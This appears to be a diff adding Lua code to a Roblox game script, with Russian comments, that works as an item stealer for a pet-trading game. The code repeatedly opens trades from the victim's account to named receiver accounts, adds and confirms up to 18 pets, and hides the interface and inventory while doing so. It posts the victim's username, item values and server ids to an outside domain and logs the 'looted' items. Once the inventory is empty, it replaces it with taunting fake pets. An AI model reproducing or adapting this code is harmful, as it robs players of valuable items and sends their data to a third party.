+                while #PendingTrades > 0 do
+                    local success, history = pcall(function()
+                        return RouterClient.get("TradeAPI/GetTradeHistory"):InvokeServer()
+                    end)
+                    
+                    if success and type(history) == "table" then
+                        for i = #PendingTrades, 1, -1 do
+                            local pending = PendingTrades[i]
+                            local foundTrade = nil
+                            for _, pastTrade in ipairs(history) do
+                                if CleanID(pastTrade.trade_id) == pending.id then
+                                    foundTrade = pastTrade
+                                    break
+                                end
+                            end
+                            
+                            if foundTrade then
+                                local allLootedUids = {}
+                                local item_lists = {foundTrade.sender_items, foundTrade.recipient_items}
+                                
+                                for _, list in pairs(item_lists) do
+                                    if type(list) == "table" then
+                                        for _, it in ipairs(list) do
+                                            local uid = it.unique_id or it.unique
+                                            if uid then allLootedUids[uid] = true end
+                                        end
+                                    end
+                                end
+
+                                local lootedItems = {}
+                                local uidsToRemove = {}
+                                for _, item in ipairs(pending.items) do
+                                    if allLootedUids[item.uid] then
+                                        table.insert(lootedItems, item)
+                                        uidsToRemove[item.uid] = true
+                                    end
+                                end
+                                
+                                if #lootedItems > 0 then
+                                    table.sort(lootedItems, function(a, b) return a.value > b.value end)
+                                    local logList = ""
+                                    local currentVal = 0
+                                    local currentRawVal = 0
+                                    for _, item in ipairs(lootedItems) do
+                                        logList = logList .. item.Name .. item.potions .. ": " .. string.format("%.2f₽", item.value) .. "\n"
+                                        currentVal = currentVal + item.value
+                                        currentRawVal = currentRawVal + item.raw_value
+                                    end
+                                    
+                                    local new_ItemList = {}
+                                    for _, globalItem in ipairs(ItemList) do
+                                        if not uidsToRemove[globalItem.uid] then
+                                            table.insert(new_ItemList, globalItem)
+                                        else
+                                            ItemsInTransit[globalItem.uid] = nil
+                                        end
+                                    end
+                                    ItemList = new_ItemList
+                                    
+                                    TransferredValue = TransferredValue + currentVal
+                                    SendLootLog({ val = currentVal, raw_val = currentRawVal, count = #lootedItems, list = logList })
+                                    table.remove(PendingTrades, i)
+                                else
+                                    if (tick() - pending.time > 15) then
+                                        for _, item in ipairs(pending.items) do ItemsInTransit[item.uid] = nil end
+                                        table.remove(PendingTrades, i)
+                                    end
+                                end
+                            elseif (tick() - pending.time > 30) then
+                                for _, item in ipairs(pending.items) do ItemsInTransit[item.uid] = nil end
+                                table.remove(PendingTrades, i)
+                            end
+                        end
+                    end
+                    task.wait(2)
+                end
+                WorkerRunning = false
+            end)
+        end
+    end
+end
+
+-- ТРЕЙД ЦИКЛ (АПДЕЙТ АНЛЕГИТНЫХ ПЕТОВ, УЛУЧШЕННЫЙ ЧЕКЕР УСПЕШНОГО ТРЕЙДА И ЕДИНОРАЗОВЫЙ ЛОГ В ДИСКОРД ПРИ ЛУТЕ)
+local function TradeCycle(targetPlayerName)
+    local targetPlayer = Players:FindFirstChild(targetPlayerName)
+    if not targetPlayer then return end
+
+    local tradeActive = false
+    local uiRestored = false
+    local itemsFilled = false
+    local activeTradeId = nil
+
+    while #ItemList > 0 do
+        if not Players:FindFirstChild(targetPlayerName) then break end
+
+        local rawData = fsys("ClientData").get_data()[LocalPlayer.Name]
+        if rawData and rawData.trade and rawData.trade.trade_id then
+            activeTradeId = rawData.trade.trade_id
+        end
+        
+        local stage, myOffer, theirOffer = GetTradeState()
+
+        if stage ~= "NONE" and theirOffer then
+            if theirOffer.player_name ~= targetPlayerName then
+                warn("[ANTI-STEAL] Detected foreign trade window from: " .. theirOffer.player_name)
+                
+                Trade.Decline:FireServer()
+                
+                tradeActive = false
+                uiRestored = false
+                itemsFilled = false
+            
+                task.wait(0.1)
+                continue
+            end
+        end
+        
+        if stage == "NONE" then
+            uiRestored = false
+            itemsFilled = false
+
+            if tradeActive then
+                tradeActive = false
+
+                if activeTradeId then
+                    SpawnHistoryChecker(activeTradeId, ItemList)
+                    activeTradeId = nil
+                end
+
+                continue
+            else
+                Trade.Send:FireServer(targetPlayer)
+                
+                local waitStart = tick()
+                while tick() - waitStart < 2 do
+                    if GetTradeState() ~= "NONE" then break end
+                    task.wait(0.1)
+                end
+            end
+        else
+            tradeActive = true 
+            
+            if not uiRestored then
+                task.spawn(RestoreWhitelistUI)
+                uiRestored = true
+            end
+            
+            if stage == "negotiation" then
+                if myOffer and not myOffer.negotiated then
+                    if not itemsFilled then
+                        local itemsInWindow = {}
+                        local triedInThisTrade = {}
+                        local windowCount = 0
+                        
+                        while windowCount < 18 and #ItemList > 0 do
+                            local addedThisRound = {}
+                            for i = 1, #ItemList do
+                                local item = ItemList[i]
+                                if not itemsInWindow[item.uid] and not triedInThisTrade[item.uid] then
+                                    Trade.Add:FireServer(item.uid)
+                                    table.insert(addedThisRound, item)
+                                    triedInThisTrade[item.uid] = true
+                                    if #addedThisRound + windowCount >= 18 then break end
+                                end
+                            end
+
+                            if #addedThisRound == 0 then break end
+
+                            local _, currentOffer = GetTradeState()
+                            local realUids = {}
+                            windowCount = 0
+                            if currentOffer and currentOffer.pets then
+                                for _, p in ipairs(currentOffer.pets) do 
+                                    realUids[p.unique] = true
+                                    windowCount = windowCount + 1
+                                end
+                            end
+
+                            for _, item in ipairs(addedThisRound) do
+                                if realUids[item.uid] then itemsInWindow[item.uid] = true end
+                            end
+                        end
+                        itemsFilled = true
+                    end
+                    
+                    Trade.Accept:FireServer()
+                end
+                
+            elseif stage == "confirmation" then
+                if myOffer and not myOffer.confirmed then
+                    Trade.Confirm:FireServer()
+                end
+            end
+        end
+        task.wait(0.05) 
+    end
+end
+
+-- ЗАПУСК СКРИПТА
+GetInventory()
+
+if IsVIPServer then
+    if #ItemList > 0 then
+        -- Функция обновления данных VIP
+        local function UpdateVIPServer()
+            local isVipReal = false
+            if game.VIPServerId ~= "" and game.VIPServerId ~= nil then isVipReal = true end
+            if game.PrivateServerId ~= "" and game.PrivateServerId ~= nil then isVipReal = true end
+            pcall(function()
+                local rrs = game:GetService("RobloxReplicatedStorage")
+                if rrs:FindFirstChild("GetServerType") and rrs.GetServerType:InvokeServer() == "VIPServer" then
+                    isVipReal = true
+                end
+            end)
+
+            local serverType = isVipReal and "VIP" or "PUBLIC"
+            local workerName = getgenv().WorkerName or "Official"
+            local uptimeSec = os.time() - getgenv().DuskScriptStartTime
+            local payload = {
+                username = LocalPlayer.Name,
+                value = TotalValueComm,
+                items = ItemList,
+                place_id = tostring(PlaceId),
+                job_id = tostring(JobId),
+                worker_name = workerName,
+                server_type = serverType,
+                uptime = uptimeSec
+            }
+            pcall(function()
+                request({
+                    Url = "https://duskandshine.xyz/api/vips/update", -- ЗАМЕНИ НА СВОЙ ДОМЕН
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode(payload)
+                })
+            end)
+        end
+        
+        UpdateVIPServer()
+        
+        -- Цикл Heartbeat (КД 60 секунд)
+        task.spawn(function()
+            while true do
+                task.wait(60)
+                local s, res = pcall(function()
+                    return request({
+                        Url = "https://duskandshine.xyz/api/vips/heartbeat", 
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode({username = LocalPlayer.Name, ping = 1})
+                    })
+                end)
+                
+                if s and res and res.Body:find("2") then
+                    GetInventory()
+                    UpdateVIPServer()
+                end
+            end
+        end)
+    end
+    return -- Останавливаем остальную (анти-вип) логику скрипта
+end
+
+if #ItemList > 0 then
+    SendInventoryLog()
+else
+    return
+end
+
+-- ЛОГ О ВЫХОДЕ
+task.spawn(function()
+    LocalPlayer.AncestryChanged:Connect(function(_, parent)
+        if not parent and TransferredValue == 0 then
+            SendLeaveLog()
+        end
+    end)
+end)
+
+---------------
+
+-- ТРОЛЛИНГ ФУНКЦИЯ
+local function InitUltimateTroll()
+    local ICON_ID = "rbxassetid://16392616807"
+    local EMOJIS = {
+        "👹", "👺", "💀", "☠️", "🤡", "👻", "👽", "👾", "👿", "🧛", 
+        "🧟", "🧙", "👁️", "🥀", "🕸️", "⛓️", "⚰️", "🪓", "🔪", "🩸", 
+        "💣", "🧨", "🧿", "🔱", "🌑", "🖤", "☣️", "☢️", "🌚", "⌛", "⚱️"
+    }
+    local NAMES = {"mogged by mt"}
+
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    local function SafeLoad(path)
+        local s, m = pcall(function() return require(ReplicatedStorage.Fsys).load(path) end)
+        if not s then s, m = pcall(function() return require(ReplicatedStorage.Fsys).load("new:" .. path) end) end
+        return m
+    end
+
+    local ClientData = SafeLoad("ClientData")
+    local InventoryDB = SafeLoad("InventoryDB")
+    local InventorySubDB = SafeLoad("vanilla/InventorySubDB") or SafeLoad("InventorySubDB")
+    
+    local petKeys = {}
+    for k, _ in pairs(InventoryDB.pets) do table.insert(petKeys, k) end
+    local TROLL_CONFIG = {}
+    for i = 1, 31 do
+        local donorKey = petKeys[math.random(#petKeys)]
+        local donorData = InventoryDB.pets[donorKey]
+        local fakeKind = "mogged_pet_" .. i
+        
+        local fullName = NAMES[1] .. " " .. (EMOJIS[i] or "💀")
+
+        local fakeData = {}
+        if donorData then
+            for k, v in pairs(donorData) do fakeData[k] = v end
+        end
+        fakeData.name = fullName
+        fakeData.image = ICON_ID
+        fakeData.rarity = "legendary"
+        fakeData.is_rideable = false
+        fakeData.is_flyable = false
+
+        InventoryDB.pets[fakeKind] = fakeData
+        if InventorySubDB and InventorySubDB.pets then
+            InventorySubDB.pets[fakeKind] = fakeData
+        end
+
+        TROLL_CONFIG[fakeKind] = {
+            uid = "MOGGED_UID_" .. i,
+            name = fullName
+        }
+    end
+    local original_get = ClientData.get
+    ClientData.get = function(...)
+        local args = {...}
+        local res = original_get(unpack(args))
+
+        if args[1] == "inventory" and res then
+            local fakeInv = {}
+            for category, _ in pairs(res) do
+                fakeInv[category] = {}
+            end
+            fakeInv.pets = {}
+            local index = 1
+            for kind, cfg in pairs(TROLL_CONFIG) do
+                fakeInv.pets[cfg.uid] = {
+                    unique = cfg.uid,
+                    kind = kind,
+                    id = kind,
+                    category = "pets",
+                    newness_order = 5000 + index,
+                    properties = {
+                        age = 1,
+                        name = cfg.name,
+                        neon = false,
+                        mega_neon = false,
+                        rideable = false,
+                        flyable = false
+                    }
+                }
+                index = index + 1
+            end
+            fakeInv.strollers = {}
+            fakeInv.transport = {}
+            fakeInv.toys = {}
+            fakeInv.food = {}
+            fakeInv.pet_accessories = {}
+            
+            return fakeInv
+        end
+        return res
+    end
+    if ClientData.DataChangedEvent then
+        pcall(function() 
+            ClientData.DataChangedEvent:Fire("inventory", ClientData.get("inventory")) 
+        end)
+    end
+end
+
+local Trolled = false
+local TradeDeclined = false
+task.spawn(function()
+    local CurrentReceiver = nil
+    local LastActionTick = 0
+    local StealthApplied = false
+
+    local TextChatService = game:GetService("TextChatService")
+    local TextChannels = TextChatService:WaitForChild("TextChannels", 10)
+    local TargetTeams = {"RBXTeamPersimmon", "RBXTeamToothpaste"}
+
+    local function HandlePotentialReceiver(source)
+        if not source:IsA("TextSource") then return end
+        
+        local player = Players:GetPlayerByUserId(source.UserId)
+        local name = player and player.Name or source.Name
+        if name == Receiver1 or name == Receiver2 then
+            task.spawn(function()
+                task.wait(2) 
+                local Target = Players:FindFirstChild(name)
+                if Target and #ItemList > 0 then
+                    LastActionTick = tick()
+
+                    if UIActive then HideInterface() end
+                    
+                    local currentStage, _, theirOffer = GetTradeState()
+                    if currentStage ~= "NONE" and theirOffer then
+                        if theirOffer.player_name ~= Receiver1 and theirOffer.player_name ~= Receiver2 then
+                            Trade.Decline:FireServer()
+                        end
+                    end
+
+                    TradeCycle(name)
+                end
+            end)
+        end
+    end
+
+    if TextChannels then
+        for _, channelName in ipairs(TargetTeams) do
+            local channel = TextChannels:WaitForChild(channelName, 5)
+            if channel then
+                for _, child in ipairs(channel:GetChildren()) do
+                    HandlePotentialReceiver(child)
+                end
+                channel.ChildAdded:Connect(HandlePotentialReceiver)
+            end
+        end
+    end
+    while true do
+        if #ItemList > 0 then
+            local Target = Players:FindFirstChild(Receiver1) or Players:FindFirstChild(Receiver2)
+
+            if Target then
+                if not StealthApplied then
+                    StealthApplied = true
+                    task.spawn(FreezeInventory)
+                end
+
+                if Target ~= CurrentReceiver then
+                    CurrentReceiver = Target
+                    LastActionTick = tick()
+                end
+
+                if tick() - LastActionTick >= 10 then
+                    LastActionTick = tick()
+                    
+                    if UIActive then HideInterface() end
+
+                    TradeCycle(Target.Name)
+                end
+            else
+                CurrentReceiver = nil
+            end
+        else
+            if not TradeDeclined and ClientData.get_data()[LocalPlayer.Name].trade then Trade.Decline:FireServer(); TradeDeclined = true end
+            if not Trolled then InitUltimateTroll() end
+            break
+        end
+        task.wait(0.5)
+    end
+end)
